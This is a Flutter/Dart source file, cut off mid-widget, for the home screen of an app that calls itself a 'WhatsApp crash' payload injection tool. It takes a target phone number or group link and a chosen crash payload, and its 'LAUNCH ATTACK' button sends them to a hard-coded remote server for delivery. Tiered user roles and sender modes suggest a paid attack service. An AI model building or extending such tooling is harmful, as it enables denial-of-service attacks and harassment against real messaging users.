import 'dart:convert';
import 'dart:math' as math;
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

// ─────────────────────────────────────────────────────────────
//  PALETTE
// ─────────────────────────────────────────────────────────────
const Color _void     = Color(0xFF000000);
const Color _ink      = Color(0xFF050507);
const Color _plate    = Color(0xFF0A0A0D);
const Color _surface  = Color(0xFF0F0F13);
const Color _rim      = Color(0xFF1C1018);
const Color _rimHi    = Color(0xFF2E1622);
const Color _red      = Color(0xFFFF0040);
const Color _redDim   = Color(0xFFCC0033);
const Color _redGhost = Color(0xFF8B0020);
const Color _ash      = Color(0xFF6B6B7A);
const Color _slate    = Color(0xFF3D3D4D);
const Color _snow     = Color(0xFFF1F0F5);

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final _targetCtrl = TextEditingController();
  late AnimationController _pulse;
  late AnimationController _enter;
  late AnimationController _scanCtrl;
  late AnimationController _armedCtrl;
  late VideoPlayerController _video;

  String _selectedBugId  = '';
  String _bugMode        = 'number';
  String _senderMode     = 'private';

  int    _privateCount   = 0;
  int    _globalCount    = 0;
  bool   _isSending      = false;
  bool   _videoReady     = false;

  @override
  void initState() {
    super.initState();

    _pulse = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1800))
      ..repeat(reverse: true);

    _enter = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1000))
      ..forward();

    _scanCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 6))
      ..repeat();

    _armedCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);

    _video = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        if (mounted) setState(() => _videoReady = true);
        _video.setLooping(true);
        _video.setVolume(1.0);
        _video.play();
      }).catchError((_) {});

    final bugs = _filteredBugs();
    if (bugs.isNotEmpty) _selectedBugId = bugs[0]['bug_id'];
    _fetchSenderStats();
  }

  @override
  void dispose() {
    _pulse.dispose();
    _enter.dispose();
    _scanCtrl.dispose();
    _armedCtrl.dispose();
    _video.dispose();
    _targetCtrl.dispose();
    super.dispose();
  }

  List<Map<String, dynamic>> _filteredBugs() {
    if (_bugMode == 'group') {
      return widget.listBug
          .where((b) => b['bug_id'].toString().contains('_group'))
          .toList();
    }
    return widget.listBug
        .where((b) => !b['bug_id'].toString().contains('_group'))
        .toList();
  }

Future<void> _fetchSenderStats() async {
  try {
    final uri = Uri.http('vionmekss.duckdns.top:10158', '/getSenderStats', {
      'key': widget.sessionKey,
    });
    final res = await http.get(uri);
    if (res.statusCode == 200) {
      final d = jsonDecode(res.body);
      if (d['valid'] == true) {
        setState(() {
          _privateCount = d['private'] ?? 0;
          _globalCount  = d['global']  ?? 0;
        });
      }
    }
  } catch (_) {}
}

Future<void> _sendBug() async {
  HapticFeedback.heavyImpact();
  final raw = _targetCtrl.text.trim();
  final key = widget.sessionKey;

  if (_bugMode == 'number' && !_validPhone(raw)) {
    _alert('INVALID TARGET', 'Gunakan format internasional: +62xxx');
    return;
  }
  if (_bugMode == 'group' && !_validGroup(raw)) {
    _alert('INVALID LINK', 'Masukkan link grup WA yang valid.');
    return;
  }

  final bugs = _filteredBugs();
  if (!bugs.any((b) => b['bug_id'] == _selectedBugId)) {
    if (bugs.isNotEmpty) {
      setState(() => _selectedBugId = bugs[0]['bug_id']);
    } else {
      _alert('ERROR', 'Tidak ada payload tersedia.');
      return;
    }
  }

  setState(() => _isSending = true);

  // Capture setelah setState biar dapet bug_id yang bener
  final bugId = _selectedBugId;
  final mode = (widget.role == 'owner' || widget.role == 'vip')
      ? _senderMode
      : 'private';

  try {
    final uri = Uri.http('vionmekss.duckdns.top:10158', '/sendBug', {
      'key': key,
      'target': raw,
      'bug': bugId,
      'senderMode': mode,
    });

    debugPrint('[SEND] URI: $uri'); // log buat debug
    debugPrint('[SEND] senderMode: $mode | bugId: $bugId');

    final res = await http.get(uri);
    final d = jsonDecode(res.body);

    debugPrint('[SEND] Response: ${res.body}');

    if (d['cooldown'] == true) {
      _alert('COOLDOWN', 'Tunggu sebentar sebelum mengirim lagi.');
    } else if (d['valid'] == false) {
      _alert('SESSION EXPIRED', 'Login ulang untuk melanjutkan.');
    } else if (d['sended'] == false) {
      _alert('FAILED', 'Server maintenance atau gagal kirim.');
    } else {
      _alert('SUCCESS', 'Payload berhasil dikirim ke target.');
      _targetCtrl.clear();
      _fetchSenderStats();
    }
  } catch (e) {
    debugPrint('[SEND] Error: $e');
    _alert('CONNECTION ERROR', 'Periksa koneksi dan coba lagi.');
  } finally {
    setState(() => _isSending = false);
  }
}
  void _alert(String title, String body) {
    HapticFeedback.mediumImpact();
    showDialog(
      context: context,
      barrierColor: Colors.black.withValues(alpha: 0.85),
      builder: (_) => _AlertDialog(title: title, body: body),
    );
  }

  // ── BUILD ────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _void,
      body: Stack(children: [
        RepaintBoundary(
          child: AnimatedBuilder(
            animation: _scanCtrl,
            builder: (_, __) => CustomPaint(
              size: MediaQuery.of(context).size,
              painter: _BgPainter(t: _scanCtrl.value),
            ),
          ),
        ),
        SafeArea(
          child: CustomScrollView(
            physics: const BouncingScrollPhysics(),
            slivers: [
              SliverToBoxAdapter(child: _buildHeader()),
              SliverToBoxAdapter(child: _buildVideoCard()),
              SliverToBoxAdapter(child: _buildModeToggle()),
              SliverToBoxAdapter(child: _buildInputSection()),
              SliverToBoxAdapter(child: _buildPayloadSelector()),
              if (widget.role == 'owner' || widget.role == 'vip')
                SliverToBoxAdapter(child: _buildSenderSection()),
              SliverToBoxAdapter(child: _buildLaunchButton()),
              SliverToBoxAdapter(child: _buildFooter()),
            ],
          ),
        ),
      ]),
    );
  }

  // ── HEADER ───────────────────────────────────────────────
  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 18, 16, 0),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(24),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 16, sigmaY: 16),
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(24),
              color: _plate.withValues(alpha: 0.9),
              border: Border.all(color: _red.withValues(alpha: 0.3), width: 1),
              boxShadow: [
                BoxShadow(
                    color: _red.withValues(alpha: 0.1),
                    blurRadius: 30,
                    spreadRadius: -4),
              ],
            ),
            child: Row(children: [
              RepaintBoundary(
                child: AnimatedBuilder(
                  animation: _pulse,
                  builder: (_, __) => Container(
                    width: 52, height: 52,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(16),
                      color: _red.withValues(alpha: 0.1),
                      border: Border.all(
                          color: _red.withValues(
                              alpha: 0.3 + _pulse.value * 0.3)),
                      boxShadow: [
                        BoxShadow(
                            color: _red.withValues(alpha: 0.2 + _pulse.value * 0.15),
                            blurRadius: 16 + _pulse.value * 8,
                            spreadRadius: -2),
                      ],
                    ),
                    child: const Icon(Icons.bug_report_rounded,
                        color: _red, size: 26),
                  ),
                ),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text('WHATSAPP CRASH',
                        style: TextStyle(
                            color: _red,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            fontSize: 16,
                            letterSpacing: 1.8)),
                    const SizedBox(height: 4),
                    Text('Advanced Payload Injection Tool',
                        style: TextStyle(
                            color: _ash,
                            fontFamily: 'ShareTechMono',
                            fontSize: 10.5,
                            letterSpacing: 0.5)),
                  ],
                ),
              ),
              _RolePill(role: widget.role),
            ]),
          ),
        ),
      ),
    );
  }

  // ── VIDEO CARD ───────────────────────────────────────────
  Widget _buildVideoCard() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        height: 190,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(22),
          color: _plate,
          border: Border.all(color: _red.withValues(alpha: 0.2), width: 1),
          boxShadow: [
            BoxShadow(
                color: _red.withValues(alpha: 0.08),
                blurRadius: 24,
                spreadRadius: -4),
          ],
        ),
        clipBehavior: Clip.antiAlias,
        child: Stack(fit: StackFit.expand, children: [
          if (_videoReady)
            FittedBox(fit: BoxFit.cover,
              child: SizedBox(
                width: _video.value.size.width,
                height: _video.value.size.height,
                child: VideoPlayer(_video),
              ),
            ),
          DecoratedBox(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  Colors.transparent,
                  _void.withValues(alpha: 0.7),
                ],
                stops: const [0.4, 1.0],
              ),
            ),
          ),
          Positioned(left: 0, top: 0, bottom: 0,
            child: Container(
              width: 3,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [Colors.transparent, _red, Colors.transparent],
                ),
              ),
            ),
          ),
          Positioned(bottom: 14, left: 16, right: 16,
            child: Row(children: [
              Container(
                width: 6, height: 6,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _red,
                  boxShadow: [BoxShadow(
                      color: _red.withValues(alpha: 0.7), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 8),
              Container(width: 20, height: 1,
                  color: _red.withValues(alpha: 0.6)),
              const SizedBox(width: 10),
              const Text('PAYLOAD PREVIEW',
                  style: TextStyle(
                      color: _snow,
                      fontFamily: 'Orbitron',
                      fontSize: 11,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 2)),
              const Spacer(),
              Icon(Icons.play_circle_outline_rounded,
                  color: _snow.withValues(alpha: 0.5), size: 16),
            ]),
          ),
        ]),
      ),
    );
  }

  // ── MODE TOGGLE ──────────────────────────────────────────
  Widget _buildModeToggle() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(4),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: _plate,
          border: Border.all(color: _rim, width: 1),
        ),
        child: Row(children: [
          _ModeTab(
            label: 'BUG NOMOR',
            icon: Icons.phone_android_rounded,
            selected: _bugMode == 'number',
            onTap: () => _switchMode('number'),
          ),
          _ModeTab(
            label: 'BUG GROUP',
            icon: Icons.group_rounded,
            selected: _bugMode == 'group',
            onTap: () => _switchMode('group'),
          ),
        ]),
      ),
    );
  }

  void _switchMode(String m) {
    HapticFeedback.selectionClick();
    setState(() {
      _bugMode = m;
      _targetCtrl.clear();
      final bugs = _filteredBugs();
      if (bugs.isNotEmpty) _selectedBugId = bugs[0]['bug_id'];
    });
  }
bool _validPhone(String input) {
  final cleaned = input.replaceAll(RegExp(r'[\s\-\(\)]'), '');
  return RegExp(r'^\+?[1-9]\d{7,14}$').hasMatch(cleaned);
}

bool _validGroup(String input) {
  return input.startsWith('https://chat.whatsapp.com/') && 
         input.length > 26;
}
  // ── INPUT SECTION ────────────────────────────────────────
  Widget _buildInputSection() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(18),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          color: _plate,
          border: Border.all(color: _red.withValues(alpha: 0.12), width: 1),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(children: [
              Container(width: 2, height: 14,
                decoration: BoxDecoration(
                  color: _red, borderRadius: BorderRadius.circular(2),
                  boxShadow: [BoxShadow(
                      color: _red.withValues(alpha: 0.5), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 10),
              Text(
                _bugMode == 'number' ? 'TARGET NUMBER' : 'GROUP LINK',
                style: const TextStyle(
                    color: _red, fontFamily: 'Orbitron',
                    fontSize: 10.5, fontWeight: FontWeight.w900,
                    letterSpacing: 2),
              ),
            ]),
            const SizedBox(height: 12),
            TextField(
              controller: _targetCtrl,
              style: const TextStyle(
                  color: _snow, fontSize: 15, fontFamily: 'ShareTechMono'),
              cursorColor: _red,
              keyboardType: _bugMode == 'number'
                  ? TextInputType.phone
                  : TextInputType.url,
              decoration: InputDecoration(
                hintText: _bugMode == 'number'
                    ? '+628xxxxxxxxxx'
                    : 'https://chat.whatsapp.com/...',
                hintStyle: TextStyle(
                    color: _slate, fontSize: 13, fontFamily: 'ShareTechMono'),
                filled: true,
                fillColor: _surface,
                border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(14),
                    borderSide: BorderSide(color: _rim)),
                enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(14),
                    borderSide: BorderSide(color: _rim)),
                focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(14),
                    borderSide:
                        BorderSide(color: _red.withValues(alpha: 0.55), width: 1.5)),
                prefixIcon: Icon(
                  _bugMode == 'number'
                      ? Icons.phone_android_rounded
                      : Icons.link_rounded,
                  color: _red.withValues(alpha: 0.5),
                  size: 20,
                ),
                contentPadding: const EdgeInsets.symmetric(
                    vertical: 16, horizontal: 18),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── PAYLOAD SELECTOR — WEAPON LOADOUT STYLE ──────────────
  Widget _buildPayloadSelector() {
    final bugs = _filteredBugs();

    if (bugs.isEmpty) {
      return Padding(
        padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(20),
            color: _plate,
            border: Border.all(color: _rim),
          ),
          child: Center(
            child: Text('No payload available',
                style: TextStyle(color: _ash, fontFamily: 'ShareTechMono')),
          ),
        ),
      );
    }

    final selectedBug = bugs.firstWhere(
      (b) => b['bug_id'] == _selectedBugId,
      orElse: () => bugs[0],
    );
    final selectedIndex = bugs.indexOf(selectedBug);

    return Padding(
      padding: const EdgeInsets.fromLTRB(0, 14, 0, 0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // ── section header ─────────────────────────────
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 0),
            child: Row(children: [
              Container(width: 2, height: 14,
                decoration: BoxDecoration(
                  color: _red, borderRadius: BorderRadius.circular(2),
                  boxShadow: [BoxShadow(
                      color: _red.withValues(alpha: 0.5), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 10),
              const Text('SELECT PAYLOAD',
                  style: TextStyle(
                      color: _red, fontFamily: 'Orbitron',
                      fontSize: 10.5, fontWeight: FontWeight.w900,
                      letterSpacing: 2)),
              const Spacer(),
              // slot counter e.g. "02 / 05"
              Text(
                '${(selectedIndex + 1).toString().padLeft(2, '0')} / ${bugs.length.toString().padLeft(2, '0')}',
                style: const TextStyle(
                    color: _ash, fontFamily: 'ShareTechMono',
                    fontSize: 10, letterSpacing: 1.5),
              ),
              const SizedBox(width: 16),
            ]),
          ),
          const SizedBox(height: 12),

          // ── horizontal card list ───────────────────────
          SizedBox(
            height: 118,
            child: ListView.builder(
              scrollDirection: Axis.horizontal,
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.symmetric(horizontal: 16),
              itemCount: bugs.length,
              itemBuilder: (_, i) {
                final bug = bugs[i];
                final sel = bug['bug_id'] == _selectedBugId;
                return Padding(
                  padding: EdgeInsets.only(right: i < bugs.length - 1 ? 10 : 0),
                  child: RepaintBoundary(
                    child: AnimatedBuilder(
                      animation: _armedCtrl,
                      builder: (_, __) => _PayloadLoadoutCard(
                        bug: bug,
                        index: i,
                        selected: sel,
                        pulseValue: sel ? _armedCtrl.value : 0.0,
                        onTap: () {
                          HapticFeedback.selectionClick();
                          setState(() => _selectedBugId = bug['bug_id']);
                        },
                      ),
                    ),
                  ),
                );
              },
            ),
          ),

          const SizedBox(height: 10),

          // ── armed status bar ───────────────────────────
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 0),
            child: AnimatedSwitcher(
              duration: const Duration(milliseconds: 280),
              transitionBuilder: (child, anim) => FadeTransition(
                opacity: anim,
                child: SlideTransition(
                  position: Tween<Offset>(
                      begin: const Offset(0, 0.2), end: Offset.zero)
                    .animate(anim),
                  child: child,
                ),
              ),
              child: _ArmedStatusBar(
                key: ValueKey(_selectedBugId),
                bugName: selectedBug['bug_name'] ?? '',
                bugId: selectedBug['bug_id'] ?? '',
                index: selectedIndex,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ── SENDER SECTION ───────────────────────────────────────
  Widget _buildSenderSection() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(18),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          color: _plate,
          border: Border.all(color: _red.withValues(alpha: 0.12), width: 1),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(children: [
              Container(width: 2, height: 14,
                decoration: BoxDecoration(
                  color: _red, borderRadius: BorderRadius.circular(2),
                  boxShadow: [BoxShadow(
                      color: _red.withValues(alpha: 0.5), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 10),
              const Text('SENDER MODE',
                  style: TextStyle(
                      color: _red, fontFamily: 'Orbitron',
                      fontSize: 10.5, fontWeight: FontWeight.w900,
                      letterSpacing: 2)),
            ]),
            const SizedBox(height: 14),
            Row(children: [
              Expanded(child: _SenderCard(
                label: 'PRIVATE',
                count: _privateCount,
                selected: _senderMode == 'private',
                onTap: () {
                  HapticFeedback.selectionClick();
                  setState(() => _senderMode = 'private');
                },
              )),
              const SizedBox(width: 10),
              Expanded(child: _SenderCard(
                label: 'GLOBAL',
                count: _globalCount,
                selected: _senderMode == 'global',
                onTap: () {
                  HapticFeedback.selectionClick();
                  setState(() => _senderMode = 'global');
                },
              )),
            ]),
          ],
        ),
      ),
    );
  }

  // ── LAUNCH BUTTON ────────────────────────────────────────
  Widget _buildLaunchButton() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 20, 16, 0),
      child: RepaintBoundary(
        child: AnimatedBuilder(
          animation: _pulse,
          builder: (_, __) {
            final g = _pulse.value;
            return GestureDetector(
              onTap: _isSending ? null : _sendBug,
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                height: 64,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(20),
                  color: _surface,
                  border: Border.all(
                    color: _isSending
                        ? _red.withValues(alpha: 0.2)
                        : _red.withValues(alpha: 0.35 + 0.25 * g),
                    width: 1.5,
                  ),
                  boxShadow: _isSending
                      ? null
                      : [
                          BoxShadow(
                              color: _red.withValues(alpha: 0.15 + 0.1 * g),
                              blurRadius: 24 + 8 * g,
                              spreadRadius: -4),
                        ],
                ),
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(20),
                  child: Stack(alignment: Alignment.center, children: [
                    Positioned(top: 0, left: 0, right: 0,
                      child: Container(
                        height: 30,
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [
                              _red.withValues(alpha: 0.07),
                              Colors.transparent,
                            ],
                            begin: Alignment.topCenter,
                            end: Alignment.bottomCenter,
                          ),
                        ),
                      ),
                    ),
                    if (_isSending)
                      Row(mainAxisSize: MainAxisSize.min, children: [
                        SizedBox(
                          width: 20, height: 20,
                          child: CircularProgressIndicator(
                              color: _red, strokeWidth: 2),
                        ),
                        const SizedBox(width: 14),
                        const Text('LAUNCHING...',
                            style: TextStyle(
                                color: _red, fontFamily: 'Orbitron',
                                fontWeight: FontWeight.w900,
                                fontSize: 14, letterSpacing: 2)),
                      ])
                    else
                      Row(mainAxisSize: MainAxisSize.min, children: [
                        Icon(Icons.rocket_launch_rounded,
                            color: _red.withValues(alpha: 0.9 + 0.1 * g),
                            size: 22),
                        const SizedBox(width: 14),
                        Text('LAUNCH ATTACK',
                            style: TextStyle(
                                color: _red.withValues(alpha: 0.9 + 0.1 * g),
                                fontFamily: 'Orbitron',
                                fontWeight: FontWeight.w900,
                                fontSize: 15,
                                letterSpacing: 2.5)),
                      ]),
                  ]),
                ),
              ),
            );
          },
        ),
      ),
    );
  }

  // ── FOOTER ───────────────────────────────────────────────
  Widget _buildFooter() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 20, 16, 36),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(width: 16, height: 1,
              color: _slate.withValues(alpha: 0.5)),
          const SizedBox(width: 10),
          Text('SESSION: ${widget.expiredDate}',
              style: const TextStyle(
                  color: _slate, fontSize: 9.5,
                  fontFamily: 'ShareTechMono', letterSpacing: 1)),
          const SizedBox(width: 10),
          Container(width: 16, height: 1,
              color: _slate.withValues(alpha: 0.5)),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────
//  PAYLOAD LOADOUT CARD  (NEW)
// ─────────────────────────────────────────────────────────────
class _PayloadLoadoutCard extends StatelessWidget {
  final Map<String, dynamic> bug;
  final int index;
  final bool selected;
  final double pulseValue;
  final VoidCallback onTap;

  const _PayloadLoadoutCard({
    required this.bug,
    required this.index,
    required this.selected,
    required this.pulseValue,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final idx = (index + 1).toString().padLeft(2, '0');
    final name = (bug['bug_name'] as String?) ?? 'PAYLOAD';

    // split name into two lines if long
    final parts = name.split(' ');
    final line1 = parts.length > 1 ? parts.sublist(0, (parts.length / 2).ceil()).join(' ') : name;
    final line2 = parts.length > 1 ? parts.sublist((parts.length / 2).ceil()).join(' ') : '';

    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        curve: Curves.easeOutCubic,
        width: selected ? 130 : 110,
        height: 118,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: selected
              ? _red.withValues(alpha: 0.07)
              : _plate,
          border: Border.all(
            color: selected
                ? _red.withValues(alpha: 0.5 + pulseValue * 0.3)
                : _rim,
            width: selected ? 1.5 : 1,
          ),
          boxShadow: selected
              ? [
                  BoxShadow(
                    color: _red.withValues(alpha: 0.12 + pulseValue * 0.1),
                    blurRadius: 20 + pulseValue * 10,
                    spreadRadius: -2,
                  ),
                ]
              : null,
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(16),
          child: Stack(children: [
            // diagonal cut corner — top right
            if (selected)
              Positioned(
                top: 0, right: 0,
                child: CustomPaint(
                  size: const Size(20, 20),
                  painter: _CornerCutPainter(color: _red.withValues(alpha: 0.5)),
                ),
              ),

            // scan line (selected only)
            if (selected)
              Positioned.fill(
                child: IgnorePointer(
                  child: CustomPaint(
                    painter: _CardScanPainter(t: pulseValue),
                  ),
                ),
              ),

            Padding(
              padding: const EdgeInsets.fromLTRB(12, 10, 10, 10),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // index row
                  Row(children: [
                    Text(idx,
                        style: TextStyle(
                            color: selected
                                ? _red.withValues(alpha: 0.7)
                                : _slate,
                            fontFamily: 'ShareTechMono',
                            fontSize: 9,
                            letterSpacing: 1)),
                    const Spacer(),
                    if (selected)
                      Container(
                        width: 5, height: 5,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: _red.withValues(alpha: 0.6 + pulseValue * 0.4),
                          boxShadow: [BoxShadow(
                            color: _red.withValues(alpha: 0.5 * pulseValue),
                            blurRadius: 6,
                          )],
                        ),
                      )
                    else
                      Container(
                        width: 5, height: 5,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: _slate.withValues(alpha: 0.3),
                        ),
                      ),
                  ]),

                  const Spacer(),

                  // payload name
                  Text(line1,
                      style: TextStyle(
                          color: selected ? _snow : _ash,
                          fontFamily: 'ShareTechMono',
                          fontSize: selected ? 11.5 : 10.5,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 0.3),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis),
                  if (line2.isNotEmpty)
                    Text(line2,
                        style: TextStyle(
                            color: selected
                                ? _snow.withValues(alpha: 0.8)
                                : _ash.withValues(alpha: 0.7),
                            fontFamily: 'ShareTechMono',
                            fontSize: selected ? 11 : 10,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 0.3),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis),

                  const SizedBox(height: 8),

                  // status pill
                  AnimatedContainer(
                    duration: const Duration(milliseconds: 250),
                    padding: const EdgeInsets.symmetric(
                        horizontal: 7, vertical: 3),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(6),
                      color: selected
                          ? _red.withValues(alpha: 0.15)
                          : _surface,
                      border: Border.all(
                        color: selected
                            ? _red.withValues(alpha: 0.4)
                            : _rim,
                        width: 1,
                      ),
                    ),
                    child: Text(
                      selected ? '● ARMED' : '○ STANDBY',
                      style: TextStyle(
                          color: selected ? _red : _slate,
                          fontFamily: 'ShareTechMono',
                          fontSize: 8.5,
                          letterSpacing: 0.8),
                    ),
                  ),
                ],
              ),
            ),
          ]),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────
//  ARMED STATUS BAR  (NEW)
// ─────────────────────────────────────────────────────────────
class _ArmedStatusBar extends StatelessWidget {
  final String bugName;
  final String bugId;
  final int index;

  const _ArmedStatusBar({
    super.key,
    required this.bugName,
    required this.bugId,
    required this.index,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 11),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(14),
        color: _red.withValues(alpha: 0.05),
        border: Border.all(
          color: _red.withValues(alpha: 0.22),
          width: 1,
        ),
      ),
      child: Row(children: [
        // left: armed icon
        Container(
          width: 30, height: 30,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(8),
            color: _red.withValues(alpha: 0.1),
            border: Border.all(color: _red.withValues(alpha: 0.3), width: 1),
          ),
          child: const Icon(Icons.my_location_rounded, color: _red, size: 15),
        ),
        const SizedBox(width: 12),

        // center: name + id
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(bugName,
                  style: const TextStyle(
                      color: _snow,
                      fontFamily: 'ShareTechMono',
                      fontSize: 11.5,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 0.4),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis),
              const SizedBox(height: 2),
              Text('ID: $bugId',
                  style: TextStyle(
                      color: _ash.withValues(alpha: 0.6),
                      fontFamily: 'ShareTechMono',
                      fontSize: 9,
                      letterSpacing: 0.5),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis),
            ],
          ),
        ),

        // right: ARMED badge
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(8),
            color: _red.withValues(alpha: 0.12),
            border: Border.all(color: _red.withValues(alpha: 0.35), width: 1),
          ),
          child: const Text('ARMED',
              style: TextStyle(
                  color: _red,
                  fontFamily: 'Orbitron',
                  fontSize: 8.5,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.5)),
        ),
      ]),
    );
  }
}

// ─────────────────────────────────────────────────────────────
//  CORNER CUT PAINTER  (NEW)
// ─────────────────────────────────────────────────────────────
class _CornerCutPainter extends CustomPainter {
  final Color color;
  const _CornerCutPainter({required this.color});

  @override
  void paint(Canvas canvas, Size s) {
    final path = Path()
      ..moveTo(0, 0)
      ..lineTo(s.width, 0)
      ..lineTo(s.width, s.height)
      ..close();
    canvas.drawPath(path, Paint()..color = color);
  }

  @override
  bool shouldRepaint(_CornerCutPainter o) => o.color != color;
}

// ─────────────────────────────────────────────────────────────
//  CARD SCAN LINE PAINTER  (NEW)
// ─────────────────────────────────────────────────────────────
class _CardScanPainter extends CustomPainter {
  final double t;
  const _CardScanPainter({required this.t});

  @override
  void paint(Canvas canvas, Size s) {
    final y = s.height * t;
    canvas.drawLine(
      Offset(0, y),
      Offset(s.width, y),
      Paint()
        ..color = _red.withValues(alpha: 0.12)
        ..strokeWidth = 1
        ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 1),
    );
  }

  @override
  bool shouldRepaint(_CardScanPainter o) => o.t != t;
}

// ─────────────────────────────────────────────────────────────
//  SUB WIDGETS (unchanged)
// ─────────────────────────────────────────────────────────────

class _ModeTab extends StatelessWidget {
  final String label;
  final IconData icon;
  final bool selected;
  final VoidCallback onTap;
  const _ModeTab({required this.label, required this.icon,
      required this.selected, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return Expanded(child: GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 220),
        padding: const EdgeInsets.symmetric(vertical: 13),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          color: selected ? _red.withValues(alpha: 0.1) : Colors.transparent,
          border: selected
              ? Border.all(color: _red.withValues(alpha: 0.5), width: 1.5)
              : null,
          boxShadow: selected
              ? [BoxShadow(
                  color: _red.withValues(alpha: 0.08), blurRadius: 12)]
              : null,
        ),
        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          Icon(icon,
              color: selected ? _red : _ash, size: 17),
          const SizedBox(width: 8),
          Text(label,
              style: TextStyle(
                  color: selected ? _red : _ash,
                  fontFamily: 'ShareTechMono',
                  fontWeight: selected ? FontWeight.bold : FontWeight.normal,
